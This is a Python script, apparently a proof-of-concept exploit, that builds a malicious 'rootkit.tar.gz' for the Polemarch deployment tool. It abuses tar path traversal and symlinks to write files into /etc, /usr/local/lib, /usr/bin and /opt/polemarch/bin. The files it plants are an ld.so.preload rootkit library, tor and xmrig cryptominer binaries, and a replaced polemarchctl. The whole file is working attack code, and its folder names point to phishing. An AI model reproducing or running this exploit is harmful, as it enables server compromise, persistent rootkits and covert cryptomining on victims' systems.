import tarfile
import os

# Project with polemarch project
# ------------------------------
POLEMARCH_PROJECT = "../Phishing/Energy_Plus_Test"

# Relatives directories symlinked
# -------------------------------
ETC_LOCAL = "aaaa"
LIB_LOCAL = "bbbb"
BIN_LOCAL = "cccc"
BIN_POLEMARCH = "dddd"

DIRECTORIES = [ETC_LOCAL, LIB_LOCAL, BIN_LOCAL, BIN_POLEMARCH]

# Rootkit folder
# --------------
ROOTKIT_FOLDER = "/test"

# Tar name
# --------
TAR_NAME = "rootkit.tar.gz"

# WARNING: No "/"" at the beginning
POC_MAPPINGS = {

    # DIRECTORIES
    # -----------
    ETC_LOCAL: "etc/",
    LIB_LOCAL: "usr/local/lib/",
    BIN_LOCAL: "usr/bin/",
    BIN_POLEMARCH: "opt/polemarch/bin/",

    # FILES
    # ----- 
    # -> etc
    "ld.so.preload": f'{ETC_LOCAL}/ld.so.preload',

    ## -> usr/local/lib
    "../rootkit/rootkit.so": f'{LIB_LOCAL}/rootkit.so',

    ## -> usr/bin
    "../cryptominer/tor": f'{BIN_LOCAL}/tor',
    "../cryptominer/xmrig": f'{BIN_LOCAL}/xmrig',

    ## -> opt/polemarch/bin
    "polemarchctl": f'{BIN_POLEMARCH}/polemarchctl'
}

def change_name(tarinfo: tarfile.TarInfo):
    if tarinfo.name in POC_MAPPINGS:
        # Path traversal attack
        if tarinfo.name in DIRECTORIES:
            name_new = f'../../../../../../../../..{ROOTKIT_FOLDER}/{tarinfo.name}'
        else:
            name_new = f'../../../../../../../../..{ROOTKIT_FOLDER}/{POC_MAPPINGS[tarinfo.name]}'

        print(f'[*] Changing {tarinfo.name} to {name_new}')
        tarinfo.name = name_new
        return tarinfo

    # Do nothing
    return tarinfo



def main():
    # Create simlinks
    try:
        for directory in DIRECTORIES:
            print(f'[*] Creating symlink {directory} -> {POC_MAPPINGS[directory]}')
            os.symlink(f'/{POC_MAPPINGS[directory]}', directory, target_is_directory=True)
    except:
        # Already created
        pass

    # Create maliciuos tar using path traversal filter attack
    with tarfile.open(f'./tar/{TAR_NAME}', "w:gz") as tar:
        for file in POC_MAPPINGS:
            tar.add(file, filter=change_name)
        
        # Copy all files from polemarch folder, removing the dirname
        print(f'[*] Copying files from {POLEMARCH_PROJECT} into tar')
        for file in os.listdir(POLEMARCH_PROJECT):
            print("    [*] Copying file", file)

            # Remove the dirname from the file
            tar.add(f'{POLEMARCH_PROJECT}/{file}', arcname=file)

    # Remove symlinks
    for directory in DIRECTORIES:
        print(f'[*] Removing symlink {directory}')
        os.remove(directory)
    

if __name__ == "__main__":
    main()